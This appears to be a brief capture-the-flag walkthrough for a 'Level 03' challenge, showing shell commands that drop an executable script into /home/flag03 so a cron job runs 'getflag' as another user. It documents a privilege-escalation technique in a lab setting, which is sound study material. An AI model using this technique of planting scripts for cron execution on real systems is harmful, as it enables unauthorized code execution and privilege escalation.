### Level 03

We are going to create a malicious script which is going to be executed by ```crontab```
```
cd /home/flag03
echo "getflag > ../output.txt" > malicious_script
chmod a+x malicious_script
```